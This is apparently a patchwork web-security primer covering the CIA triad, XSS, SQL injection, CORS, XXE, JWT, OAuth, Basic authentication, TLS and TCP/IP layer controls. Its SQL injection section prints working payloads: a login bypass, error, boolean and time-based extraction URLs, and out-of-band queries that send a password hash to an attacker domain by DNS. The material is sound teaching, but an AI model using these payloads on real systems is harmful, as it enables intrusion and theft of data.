# Confidentiality, Integrity, and Availability

### Confidentiality

Confidentiality refers to protecting information from being accessed by unauthorized parties. In other words, only the people who are authorized to do so can gain access to sensitive data. Imagine your bank records. You should be able to access them, of course, and employees at the bank who are helping you with a transaction should be able to access them, but no one else should. A failure to maintain confidentiality means that someone who shouldn't have access has managed to get it, through intentional behavior or by accident. Such a failure of confidentiality, commonly known as a breach, typically cannot be remedied. Once the secret has been revealed, there's no way to un-reveal it. If your bank records are posted on a public website, everyone can know your bank account number, balance, etc., and that information can't be erased from their minds, papers, computers, and other places. Nearly all the major security incidents reported in the media today involve major losses of confidentiality.

So, in summary, a breach of confidentiality means that someone gains access to information who shouldn't have access to it.

### Integrity

Integrity refers to ensuring the authenticity of information—that information is not altered, and that the source of the information is genuine. Imagine that you have a website and you sell products on that site. Now imagine that an attacker can shop on your web site and maliciously alter the prices of your products, so that they can buy anything for whatever price they choose. That would be a failure of integrity, because your information—in this case, the price of a product—has been altered and you didn't authorize this alteration. Another example of a failure of integrity is when you try to connect to a website and a malicious attacker between you and the website redirects your traffic to a different website. In this case, the site you are directed to is not genuine.

### Availability

Availability means that information is accessible by authorized users. If an attacker is not able to compromise the first two elements of information security (see above) they may try to execute attacks like denial of service that would bring down the server, making the website unavailable to legitimate users due to lack of availability.

# Introduction to cross-site scripting 

### What is cross-site scripting and why should I care?

Cross-site scripting (XSS) is a security bug that can affect websites. If present in your website, this bug can allow an attacker to add their own malicious JavaScript code onto the HTML pages displayed to your users. Once executed by the victim's browser, this code could then perform actions such as completely changing the behavior or appearance of the website, stealing private data, or performing actions on behalf of the user. 

### Preventing XSS

#### Nothing is foolproof

We provide some suggestions on how you can minimize the chance that your website will contain XSS vulnerabilities. But keep in mind that both security and technology evolves very rapidly; so, no guarantees--what works today may not fully work tomorrow (hackers can be pretty clever).

#### What can I do to prevent XSS?

A common technique for preventing XSS vulnerabilities is "escaping". The purpose of character and string escaping is to make sure that every part of a string is interpreted as a string primitive, not as a control character or code.

For example, ```&lt;``` is the HTML encoding for the ```<``` character. If you include: 

```html
<script>alert('testing')</script>
```

in the HTML of a page, the script will execute. But if you include: 

```html
&lt;script&gt;alert('testing')&lt;/script&gt;
```

in the HTML of a page, it will print out the text ```<script>alert('testing')</script>```, but it will not actually execute the script. By escaping the \<script> tags, we prevented the script from executing. Technically, what we did here is "encoding" not "escaping", but "escaping" conveys the basic concept (and we'll see later that in the case of JavaScript, "escaping" actually is the correct term).

The following can help minimize the chances that your website will contain XSS vulnerabilities: 

- Using a template system with context-aware auto-escaping
- Manually escaping user input (if it’s not possible to use a template system with context-aware auto-escaping)
- Understanding common browser behaviors that lead to XSS
- Learning the best practices for your technology

#### Use a template system with context-aware auto-escaping

The simplest and best means to protect your application and your users from XSS bugs is to use a web template system or web application development framework that auto-escapes output and is context-aware.

"Auto-escaping" refers to the ability of a template system or web development framework to automatically escape user input in order to prevent any scripts embedded in the input from executing. If you wanted to prevent XSS without auto-escaping, you would have to manually escape input; this means writing your own custom code (or call an escape function) everywhere your application includes user-controlled data. In most cases, manually escaping input is not recommended; we'll discuss manual escaping in the next section.

"Context-aware" refers to the ability to apply different forms of escaping based on the appropriate context. Because CSS, HTML, URLs, and JavaScript all use different syntax, different forms of escaping are required for each context. The following example HTML template uses variables in all of these different contexts: 

```html
<body>
  <span style="color:{{ USER_COLOR }};">
    Hello {{ USERNAME }}, view your <a href="{{ USER_ACCOUNT_URL }}">Account</a>.
  </span>
  <script>
    var id = {{ USER_ID }};
    alert("Your user ID is: " + id);
  </script>
</body>
```
####  A note on manually escaping input

Writing your own code for escaping input and then properly and consistently applying it is extremely difficult. We do not recommend that you manually escape user-supplied data. Instead, we strongly recommend that you use a templating system or web development framework that provides context-aware auto-escaping. If this is impossible for your website, use existing libraries and functions that are known to work, and apply these functions consistently to all user-supplied data and all data that isn't directly under your control.

#### Understand common browser behaviors that lead to XSS

If you follow the practices from the previous section, you can reduce your risk of introducing XSS bugs into your applications. There are, however, more subtle ways in which XSS can surface. To mitigate the risk of these corner cases, consider the following: 

- Specify the correct ```Content-Type``` and ```charset``` for all responses that can contain user data.
  - Without such headers, many browsers will try to automatically determine the appropriate response by performing content or character set sniffing. This may allow external input to fool the browser into interpreting part of the response as HTML markup, which in turn can lead to XSS.
- Make sure all user-supplied URLs start with a safe protocol. 
  - It's often necessary to use URLs provided by users, for example as a continue URL to redirect after a certain action, or in a link to a user-specified resource. If the protocol of the URL is controlled by the user, the browser can interpret it as a scripting URI (e.g. ```javascript:```, ```data:```, and others) and execute it. To prevent this, always verify that the URL begins with a whitelisted value (usually only ```http://``` or ```https://```). 
- Host user-uploaded files in a sandboxed domain.

# What is the SQL Injection Vulnerability & How to Prevent it?

### Non-Technical Explanation of the SQL Injection Vulnerability

Imagine a fully-automated bus that functions based on instructions given by humans through a standard web form. That form might look like this:


> Drive through **<route>** and **<where should the bus stop?>** if **<when should the bus stop?>**.


Sample Populated Form

> Drive through **route 66** and **stop at bus stops** if **there are people at the bus stops**.

Values in bold are provided by humans and instruct the bus. Imagine a scenario where someone manages to send these instructions:

> Drive through **route 66** and **do not stop at bus stops and ignore the rest of this form.** if there are people at the bus stops.

The bus is fully-automated. It does exactly as instructed: it drives up route 66 and does not stop at any bus stop, even when there are people waiting. Such an injection is possible because the query structure and the supplied data are not separated correctly. The automated bus does not differentiate between instructions and data; it simply parses anything it is fed.

SQL injection vulnerabilities are based on the same concept. Attackers are able to inject malicious instructions into benign ones, all of which are then sent to the database server through a web application.

### Technical Explanation of SQL Injection Vulnerability

As the name suggests, an SQL injection vulnerability allows an attacker to inject malicious input into an SQL statement. To fully understand the issue, we first have to understand how server-side scripting languages handle SQL queries.

For example, let's say functionality in the web application generates a string with the following SQL statement:

```
$statement = "SELECT * FROM users WHERE username = 'bob' AND password = 'mysecretpw'";
```

This SQL statement is passed to a function that sends the string to the connected database where it is parsed, executed and returns a result.

As you might have noticed the statement contains some new, special characters:

- ```*```  (asterisk) is an instruction for the SQL database to return all columns for the selected database row
- ```=```  (equals) is an instruction for the SQL database to only return values that match the searched string
- ```'```  (single quote mark) is used to tell the SQL database where the search string starts or ends

Now consider the following example in which a website user is able to change the values of '$user' and '$password', such as in a login form:

```
$statement = "SELECT * FROM users WHERE username = '$user' AND password

= '$password'";
```

An attacker can easily insert any special SQL syntax inside the statement, if the input is not sanitized by the application:

```
$statement = "SELECT * FROM users WHERE username = 'admin'; -- ' AND password
= 'anything'";
= 'anything'";
```

What is happening here? (admin'; --) is the attacker's input, which contains two new, special characters:


- ```;``` (semicolon) is used to instruct the SQL parser that the current statement has ended (not necessary in most cases)
- ```--``` (double hyphen) instructs the SQL parser that the rest of the line (shown in light grey above) is a comment and should not be executed

This SQL injection effectively removes the password verification, and returns a dataset for an existing user – 'admin' in this case. The attacker can now log in with an administrator account, without having to specify a password.

### The Different Types of SQL Injection Vulnerability

Attackers can exfiltrate data from servers by exploiting SQL Injection vulnerabilities in various ways. Common methods include retrieving data based on: errors, conditions (true/false) and timing . Let’s look at the variants.

#### Error-Based SQL Injection

When exploiting an error-based SQL Injection vulnerability, attackers can retrieve information such as table names and content from visible database errors.

Error-Based SQL Injection Example

```
https://example.com/index.php?id=1+and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

This Request Returned an Error

```
Duplicate entry 'database1' for key 'group_key'
```

The same method works for table names and content. Disabling error messages on production systems helps to prevent attackers from gathering such information.

#### Boolean-Based SQL Injection

Sometimes there is no visible error message on the page when an SQL query fails, making it difficult for an attacker to get information from the vulnerable application. However there is still a  way to extract information.

When an SQL query fails, sometimes some parts of the web page disappear or change, or the entire website can fail to load. These indications allow attackers to determine whether the input parameter is vulnerable and whether it allows extraction of data.

Attackers can test for this by inserting a condition into an SQL query:

```
https://example.com/index.php?id=1+AND+1=1
```

If the page loads as usual, it might indicate that it is vulnerable to an SQL Injection. To be sure, an attacker typically tries to provoke a false result using something like this:

```
https://example.com/index.php?id=1+AND+1=2
```

Since the condition is false, if no result is returned or the page does not work as usual (missing text or a white page is displayed, for example), it might indicate that the page is vulnerable to an SQL injection.

Here is an example of how to extract data in this way:

```
https://example.com/index.php?id=1+AND+IF(version()+LIKE+'5%',true,false)
```

With this request, the page should load as usual if the database version is 5.X. But, it will behave differently (display an empty page, for example) if the version is different, indicating whether it it is vulnerable to an SQL injection.

#### Time-Based SQL Injection

In some cases, even though a vulnerable SQL query does not have any visible effect on the output of the page, it may still be possible to extract information from an underlying database.

Hackers determine this by instructing the database to wait (sleep) a stated amount of time before responding. If the page is not vulnerable, it will load quickly; if it is vulnerable it will take longer than usual to load. This enables hackers to extract data, even though there are no visible changes on the page. The SQL syntax can be similar to the one used in the Boolean-Based SQL Injection Vulnerability.

But to set a measurable sleep time, the 'true' function is changed to something that takes some time to execute, such as 'sleep(3)' which instructs the database to sleep for three seconds:

```
https://example.com/index.php?id=1+AND+IF(version()+LIKE+'5%',sleep(3),false)
```

If the page takes longer than usual to load it is safe to assume that the database version is 5.X.

#### Out-of-Band SQL Injection Vulnerability

Sometimes the only way an attacker can retrieve information from a database is to use out-of-band techniques. Usually these type of attacks involve sending the data directly from the database server to a machine that is controlled by the attacker. Attackers may use this method if an injection does not occur directly after supplied data is inserted, but at a later point in time.

Out-of-Band Example

```
https://example.com/index.php?id=1+AND+(SELECT+LOAD_FILE(concat('\\\\',(SELECT @@version),'example.com\\')))
```

```
https://www.example.com/index.php?query=declare @pass nvarchar(100);SELECT @pass=(SELECT TOP 1 password_hash FROM users);exec('xp_fileexist ''\\' + @pass + '.example.com\c$\boot.ini''')
```

In these requests, the target makes a DNS request to the attacker-owned domain, with the query result inside the sub domain. This means that an attacker does not need to see the result of the injection, but can wait until the database server sends a request instead.

### Impacts of SQL Injection Vulnerability

There are a number of things an attacker can do when exploiting an SQL injection on a vulnerable website. Usually, it depends on the privileges of the user the web application uses to connect to the database server. By exploiting an SQL injection vulnerability, an attacker can:

- Add, delete, edit or read content in the database
- Read source code from files on the database server
- Write files to the database server

It all depends on the capabilities of the attacker, but the exploitation of an SQL injection vulnerability can even lead to a complete takeover of the database and web server. You can learn more useful tips on how to test the impact of an SQL injection vulnerability on your website by referring to the [SQL injection cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/).

A good way to prevent damage is to restrict access as much as possible (for example, do not connect to the database using the sa or root account). It is also sensible to have different databases for different purposes (for example, separating the database for the shop system and the support forum of your website).

### Preventing SQL Injection Vulnerabilities

Server-side scripting languages are not able to determine whether the SQL query string is malformed. All they can do is send a string to the database server and wait for the interpreted response.

Surely, there must be a way to simply sanitize user input and ensure an SQL injection is infeasible.  Unfortunately, that is not always the case.  There are perhaps an infinite number of ways to sanitize user input, from globally applying PHP's addslashes() to everything (which may yield undesirable results), all the way down to applying the sanitization to "clean" variables at the time of assembling the SQL query itself, such as wrapping the above $_GET['id'] in PHP's mysql_escape_string() function.  However, applying sanitization at the query itself is a very poor coding practice and difficult to maintain or keep track of.  This is where database systems have employed the use of [prepared statements](http://en.wikipedia.org/wiki/Prepared_statement).

# Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, or port) from its own.

An example of a cross-origin request: the front-end JavaScript code served from ```https://domain-a.com``` uses ```XMLHttpRequest``` to make a request for ```https://domain-b.com/data.json```.

For security reasons, browsers restrict cross-origin HTTP requests initiated from scripts. For example, ```XMLHttpRequest``` and the Fetch API follow the same-origin policy. This means that a web application using those APIs can only request resources from the same origin the application was loaded from, unless the response from other origins includes the right CORS headers.

> The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set.

> The same-origin policy is a critical security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors.

![](https://media.prod.mdn.mozit.cloud/attachments/2016/10/28/14295/a21a85eaccd405d608395b4ca8d82538/CORS_principle.png)

The CORS mechanism supports secure cross-origin requests and data transfers between browsers and servers. Modern browsers use CORS in APIs such as XMLHttpRequest or Fetch to mitigate the risks of cross-origin HTTP requests.

### What requests use CORS?

This cross-origin sharing standard can enable cross-site HTTP requests for:

- Invocations of the ```XMLHttpRequest``` or Fetch APIs, as discussed above.
- Web Fonts (for cross-domain font usage in ```@font-face``` within CSS), so that servers can deploy TrueType fonts that can only be cross-site loaded and used by web sites that are permitted to do so.
- WebGL textures.
- Images/video frames drawn to a canvas using ```drawImage()```.
- CSS Shapes from images.

### Functional overview

The Cross-Origin Resource Sharing standard works by adding new HTTP headers that let servers describe which origins are permitted to read that information from a web browser. Additionally, for HTTP request methods that can cause side-effects on server data (in particular, HTTP methods other than ```GET```, or ```POST``` with certain MIME types), the specification mandates that browsers "preflight" the request, soliciting supported methods from the server with the HTTP ```OPTIONS``` request method, and then, upon "approval" from the server, sending the actual request. Servers can also inform clients whether "credentials" (such as Cookies and HTTP Authentication) should be sent with requests.

CORS failures result in errors, but for security reasons, specifics about the error are not available to JavaScript. All the code knows is that an error occurred. The only way to determine what specifically went wrong is to look at the browser's console for details.

# XML external entity (XXE) injection

### What is XML external entity injection?

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks. 

### How do XXE vulnerabilities arise?

Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL. 

### What are the types of XXE attacks?

There are various types of XXE attacks:

- Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
- Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
- Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
- Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

### How to prevent XXE vulnerabilities

Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features.

Generally, it is sufficient to disable resolution of external entities and disable support for ```XInclude```. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities. 

# JSON Web Token (JWT) explained

JSON Web Token is a standard used to create access tokens for an application.

It works this way: the server generates a token that certifies the user identity, and sends it to the client.

The client will send the token back to the server for every subsequent request, so the server knows the request comes from a particular identity.

This architecture proves to be very effective in modern Web Apps, where after the user is authenticated we perform API requests either to a REST or a GraphQL API.

Who uses JWT? Google, for example. If you use the Google APIs, you will use JWT.

A JWT is cryptographically signed (but not encrypted, hence using HTTPS is mandatory when storing user data in the JWT), so there is a guarantee we can trust it when we receive it, as no middleman can intercept and modify it, or the data it holds, without invalidating it.

That said, JWTs are often criticized for their overuse, and especially for them being used when less problematic solutions can be used.

You need to form your opinion around the subject. I’m not advocating for a technology over another, just presenting all the opportunities and tools you have at your disposal.

What are they good for? Mainly API authentication, and server-to-server authorization.

### How is a JWT token generated?

Using Node.js you can generate the first part of the token by using this code:

```js
const header = { "alg": "HS256", "typ": "JWT" }
const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64')
```

We set the signing algorithm to be ```HMAC SHA256``` (JWT supports multiple algorithms), then we create a buffer from this JSON-encoded object, and we encode it using base64.

The partial result is ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9```.

Next we add the payload, which we can customize with any kind of data. There are reserved keys, including ```iss``` and ```exp``` which identify the issuer and the expiration time of the token.

You can add your own data to the token by using an object:

```js
const payload = { username: 'Flavio' }
```

We convert this object, JSON-encoded, to a Buffer and we encode the result using base64, just like we did before:

```js
const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64')
```

In this case the partial result is ```eyJ1c2VybmFtZSI6IkZsYXZpbyJ9```.

Next, we get a signature from the header and payload content, which makes sure our content can’t be changed even if intercepted as our signature will be invalidated. To do this, we’ll use the ```crypto``` Node module:

```js
const crypto = require('crypto')
const jwtSecret = 'secretKey'

const signature = crypto.createHmac('sha256', jwtSecret).update(encodedHeader + '.' + encodedPayload).digest('base64')
```

We use the ```secretKey``` secret key and create a base64 encoded representation of the encrypted signature.

The value of the signature in our case is

```
MQWECYWUT7bayj8miVgsj8KdYI3ZRVS+WRRZjfZrGrw=
```

We are almost done, we just need to concatenate the 3 parts of header, payload and signature by separating them with a dot:

```js
const jwt = `${encodedHeader}.${encodedPayload}.${signature}`
```

### API authentication

This is probably the only sensible way to use JWT.

A common scenario is: you sign up for a service and download a JWT from the service dashboard. This is what you will use from now on to authenticate all your requests to the server.

Another use case, which is the opposite, is sending the JWT when you manage the API and clients connect to you, and you want your users to send subsequent requests by just passing the token.

In this case, the client needs to store the token somewhere. Where is the best place? In an **HttpOnly cookie**. The other methods are all prone to XSS attacks and as such they should be avoided. An HttpOnly cookie is not accessible from JavaScript, and is automatically sent to the origin server upon every request, so it perfectly suits the use case.

### Don’t use JWTs as session tokens

You should not use JWTs for sessions. Use a regular server-side session mechanism, as it’s much more efficient and less prone to data exposure.

# What is OAuth? Definition and How it Works

### What is OAuth?

OAuth is an open-standard authorization protocol or framework that provides applications the ability for “secure designated access.” For example, you can tell Facebook that it’s OK for ESPN.com to access your profile or post updates to your timeline without having to give ESPN your Facebook password. This minimizes risk in a major way: In the event ESPN suffers a breach, your Facebook password remains safe.

OAuth doesn’t share password data but instead uses authorization tokens to prove an identity between consumers and service providers. OAuth is an authentication protocol that allows you to approve one application interacting with another on your behalf without giving away your password.

### OAuth Explained

OAuth is about authorization and not authentication. Authorization is asking for permission to do stuff. Authentication is about proving you are the correct person because you know things. OAuth doesn’t pass authentication data between consumers and service providers – but instead acts as an authorization token of sorts.

The common analogy I’ve seen used while researching OAuth is the valet key to your car. The valet key allows the valet to start and move the car but doesn’t give them access to the trunk or the glove box.

![](https://blogvaronis2.wpengine.com/wp-content/uploads/2012/04/oauth-explained-960x584.png)

An OAuth token is like that valet key. As a user, you get to tell the consumers what they can use and what they can’t use from each service provider. You can give each consumer a different valet key. They never have the full key or any of the private data that gives them access to the full key.

### How OAuth Works

There are 3 main players in an OAuth transaction: the user, the consumer, and the service provider.  This triumvirate has been affectionately deemed the OAuth Love Triangle.

In our example, Joe is the user, Bitly is the consumer, and Twitter is the service provided who controls Joe’s secure resource (his Twitter stream).  Joe would like Bitly to be able to post shortened links to his stream.  Here’s how it works:

- **Step 1** – The User Shows Intent

  -  **Joe (User):** “Hey, Bitly, I would like you to be able to post links directly to my Twitter stream.”
    
  -  **Bitly (Consumer):** “Great! Let me go ask for permission.”

- **Step 2** – The Consumer Gets Permission

  -  **Bitly:** “I have a user that would like me to post to his stream. Can I have a request token?”
    
  -  **Twitter (Service Provider):** “Sure.  Here’s a token and a secret.”

The secret is used to prevent request forgery.  The consumer uses the secret to sign each request so that the service provider can verify it is actually coming from the consumer application.

- **Step 3** – The User Is Redirected to the Service Provider

  -  **Bitly:** “OK, Joe.  I’m sending you over to Twitter so you can approve.  Take this token with you.”
  
  -  **Joe:** “OK!”

<Bitly directs Joe to Twitter for authorization>

This is the scary part. If Bitly were super-shady Evil Co. it could pop up a window that looked like Twitter but was really phishing for your username and password.  Always be sure to verify that the URL you’re directed to is actually the service provider (Twitter, in this case).

- **Step 4** – The User Gives Permission

  -  **Joe:** “Twitter, I’d like to authorize this request token that Bitly gave me.”
    
  -  **Twitter:** “OK, just to be sure, you want to authorize Bitly to do X, Y, and Z with your Twitter account?”
    
  -  **Joe:** “Yes!”
    
  -  **Twitter:** “OK, you can go back to Bitly and tell them they have permission to use their request token.”

Twitter marks the request token as “good-to-go,” so when the consumer requests access, it will be accepted (so long as it’s signed using their shared secret).

- **Step 5** – The Consumer Obtains an Access Token

  -  **Bitly:** “Twitter, can I exchange this request token for an access token?”

  -  **Twitter:** “Sure.  Here’s your access token and secret.”

- **Step 6** – The Consumer Accesses the Protected Resource

  -  **Bitly:** “I’d like to post this link to Joe’s stream.  Here’s my access token!”
  
  -  **Twitter:** “Done!”

In our scenario, Joe never had to share his Twitter credentials with Bitly.  He simply delegated access using OAuth in a secure manner.  At any time, Joe can login to Twitter and review the access he has granted and revoke tokens for specific applications without affecting others.  OAuth also allows for granular permission levels.  You can give Bitly the right to post to your Twitter account, but restrict LinkedIn to read-only access.

### OAuth 1.0 vs. OAuth 2.0

OAuth 2.0 is a complete redesign from OAuth 1.0, and the two are not compatible. If you create a new application today, use OAuth 2.0. This blog only applies to OAuth 2.0, since OAuth 1.0 is deprecated.

OAuth 2.0 is faster and easier to implement. OAuth 1.0 used complicated cryptographic requirements, only supported three flows, and did not scale.

OAuth 2.0, on the other hand, has six flows for different types of applications and requirements, and enables signed secrets over HTTPS. OAuth tokens no longer need to be encrypted on the endpoints in 2.0 since they are encrypted in transit.

# Basic access authentication

In the context of an HTTP transaction, **basic access authentication** is a method for an HTTP user agent (e.g. a web browser) to provide a user name and password when making a request. In basic HTTP authentication, a request contains a header field in the form of ```Authorization: Basic <credentials>```, where credentials is the base64 encoding of id and password joined by a single colon :.

It is specified in RFC 7617 from 2015, which obsoletes [RFC 2617](https://tools.ietf.org/html/rfc2617) from 1999.

### Features

HTTP Basic authentication (BA) implementation is the simplest technique for enforcing access controls to web resources because it does not require cookies, session identifiers, or login pages; rather, HTTP Basic authentication uses standard fields in the HTTP header. 

Security

The BA mechanism provides no confidentiality protection for the transmitted credentials. They are merely encoded with Base64 in transit, but not encrypted or hashed in any way. Therefore, basic authentication is typically used in conjunction with HTTPS to provide confidentiality.

Because the BA field has to be sent in the header of each HTTP request, the web browser needs to cache credentials for a reasonable period of time to avoid constantly prompting the user for their username and password. Caching policy differs between browsers. Microsoft Internet Explorer caches the credentials for fifteen minutes by default.

HTTP does not provide a method for a web server to instruct the client to "log out" the user. However, there are a number of methods to clear cached credentials in certain web browsers. One of them is redirecting the user to a URL on the same domain, using credentials that are intentionally incorrect. However, this behavior is inconsistent between various browsers and browser versions. Microsoft Internet Explorer offers a dedicated JavaScript method to clear cached credentials:

```html
<script>document.execCommand('ClearAuthenticationCache');</script>
```

### Protocol
#### Server side

When the server wants the user agent to authenticate itself towards the server, the server must respond appropriately to unauthenticated requests.

To unauthenticated requests, the server should return a response whose header contains a HTTP 401 Unauthorized status and a WWW-Authenticate field.

The WWW-Authenticate field for basic authentication is constructed as following: 

```
WWW-Authenticate: Basic realm="User Visible Realm"
```

The server may choose to include the charset parameter from \[rfc:7617 RFC] \[rfc:7617 7617]:

```
WWW-Authenticate: Basic realm="User Visible Realm", charset="UTF-8"
```

This parameter indicates that the server expects the client to use UTF-8 for encoding username and password (see below).

#### Client side

When the user agent wants to send authentication credentials to the server, it may use the Authorization field.

The Authorization field is constructed as follows:

1.    The username and password are combined with a single colon (:). This means that the username itself cannot contain a colon.
2.   The resulting string is encoded into an octet sequence. The character set to use for this encoding is by default unspecified, as long as it is compatible with US-ASCII, but the server may suggest use of UTF-8 by sending the charset parameter.
3.    The resulting string is encoded using a variant of Base64.
4.    The authorization method and a space (e.g. "Basic ") is then prepended to the encoded string.

For example, if the browser uses Aladdin as the username and OpenSesame as the password, then the field's value is the base64-encoding of Aladdin:OpenSesame, or QWxhZGRpbjpPcGVuU2VzYW1l. Then the Authorization header will appear as:

```
Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l
```

# Transport Layer Security

The security of any connection using Transport Layer Security (TLS) is heavily dependent upon the cipher suites and security parameters selected. This article's goal is to help you make these decisions to ensure the confidentiality and integrity communication between client and server. The Mozilla Operations Security (OpSec) team maintains a wiki entry with reference configurations for servers.

The Transport Layer Security (TLS) protocol is the standard for enabling two networked applications or devices to exchange information privately and robustly. Applications that use TLS can choose their security parameters, which can have a substantial impact on the security and reliability of data. This article provides an overview of TLS and the kinds of decisions you need to make when securing your content.

### HTTP over TLS

TLS provides three primary services that help ensure the safety and security of data exchanged with it:

#### Authentication

Authentication lets each party to the communication verify that the other party is who they claim to be.

#### Encryption

Data is encrypted while being transmitted between the user agent and the server, in order to prevent it from being read and interpreted by unauthorized parties.

#### Integrity

TLS ensures that between encrypting, transmitting, and decrypting the data, no information is lost, damaged, tampered with, or falsified.

A TLS connection starts with a handshake phase where a client and server agree on a shared secret and important parameters, like cipher suites, are negotiated. Once parameters and a data exchange mode where application data, such HTTP, is exchanged.

# TCP/IP Security

TCP/IP is widely used throughout the world to provide network communications.  TCP/IP communications are composed of four layers that work together.  When a user wants to transfer data across networks, the data is passed from the highest layer through intermediate layers to the lowest layer, with each layer adding information.  At each layer, the logical units are typically composed of a header and a payload.  The payload consists of the information passed down from the previous layer, while the header contains layer-specific information such as addresses.  At the application layer, the payload is the actual application data.  The lowest layer sends the accumulated data through the physical network; the data is then passed up through the layers to its destination.  Essentially, the data produced by a layer is encapsulated in a larger container by the layer below it.  The four TCP/IP layers, from highest to lowest, are shown below.

- **Application Layer.**  This layer sends and receives data for particular applications, such as Domain Name System (DNS), HyperText Transfer Protocol (HTTP), and Simple Mail Transfer Protocol (SMTP).

- **Transport Layer.**  This layer provides connection-oriented or connectionless services for transporting application layer services between networks.  The transport layer can optionally assure the reliability of communications.  Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) are commonly used transport layer protocols.

- **Network Layer.**  This layer routes packets across networks.  Internet Protocol (IP) is the fundamental network layer protocol for TCP/IP.  Other commonly used protocols at the network layer are Internet Control Message Protocol (ICMP) and Internet Group Management Protocol (IGMP).

- **Data Link Layer.**  This layer handles communications on the physical network components.  The best-known data link layer protocol is Ethernet.

Security controls exist for network communications at each layer of the TCP/IP model.  As previously explained, data is passed from the highest to the lowest layer, with each layer adding more information.  Because of this, a security control at a higher layer cannot provide protection for lower layers, because the lower layers perform functions of which the higher layers are not aware.  Security controls that are available at each layer include:

### Application Layer.

Separate controls must be established for each application.  For example, if an application needs to protect sensitive data sent across networks, the application may need to be modified to provide this protection.  While this provides a very high degree of control and flexibility over the application’s security, it may require a large resource investment to add and configure controls properly for each application.  Designing a cryptographically sound application protocol is very difficult, and implementing it properly is even more challenging, so creating new application layer security controls is likely to create vulnerabilities.  Also, some applications, particularly off-the-shelf software, may not be capable of providing such protection.  While application layer controls can protect application data, they cannot protect TCP/IP information such as IP addresses because this information exists at a lower layer.  Whenever possible, application layer controls for protecting network communications should be standards-based solutions that have been in use for some time.  One example is Secure Multipurpose Internet Mail Extensions (S/MIME), which is commonly used to encrypt email messages.

### Transport Layer.

Controls at this layer can be used to protect the data in a single communication session between two hosts.  Because IP information is added at the network layer, transport layer controls cannot protect it.  The most common use for transport layer protocols is securing HTTP traffic; the Transport Layer Security (TLS) protocol is usually used for this.  (TLS is the standards-based version of SSL version 3.  More information on TLS is available in RFC 4346, The TLS Protocol Version 1.1, available at https://www.ietf.org/rfc/rfc4346.txt.  Another good source of information is NIST SP 800-52, Guidelines on the Selection and Use of Transport Layer Security, available from https://csrc.nist.gov/publications/nistpubs/.) The use of TLS typically requires each application to support TLS; however, unlike application layer controls, which typically involve extensive customization of the application, transport layer controls such as TLS are much less intrusive because they do not need to understand the application’s functions or characteristics.  Although using TLS may require modifying some applications, TLS is a well-tested protocol that has several implementations that have been added to many applications, so it is a relatively low-risk option compared to adding protection at the application layer.  Traditionally TLS has been used to protect HTTP-based communications and can be used with SSL portal VPNs.

### Network Layer.

Controls at this layer can be applied to all applications; thus, they are not application-specific.  For example, all network communications between two hosts or networks can be protected at this layer without modifying any applications on the clients or the servers.  In some environments, network layer controls such as Internet Protocol Security (IPsec) provide a much better solution than transport or application layer controls because of the difficulties in adding controls to individual applications.  Network layer controls also provide a way for network administrators to enforce certain security policies.  Another advantage of network layer controls is that since IP information (e.g., IP addresses) is added at this layer, the controls can protect both the data within the packets and the IP information for each packet.  However, network layer controls provide less control and flexibility for protecting specific applications than transport and application layer controls.  SSL tunnel VPNs provide the ability to secure both TCP and UDP communications including client/server and other network traffic, and therefore act as network layer VPNs.

### Data Link Layer.

Data link layer controls are applied to all communications on a specific physical link, such as a dedicated circuit between two buildings or a dial-up modem connection to an Internet Service Provider (ISP).  Data link layer controls for dedicated circuits are most often provided by specialized hardware devices known as data link encryptors; data link layer controls for other types of connections, such as dial-up modem communications, are usually provided through software.  Because the data link layer is below the network layer, controls at this layer can protect both data and IP information.  Compared to controls at the other layers, data link layer controls are relatively simple, which makes them easier to implement; also, they support other network layer protocols besides IP.  Because data link layer controls are specific to a particular physical link, they cannot protect connections with multiple links, such as establishing a VPN over the Internet.  An Internet-based connection is typically composed of several physical links chained together; protecting such a connection with data link layer controls would require deploying a separate control to each link, which is not feasible.  Data link layer protocols have been used for many years primarily to provide additional protection for specific physical links that should not be trusted.

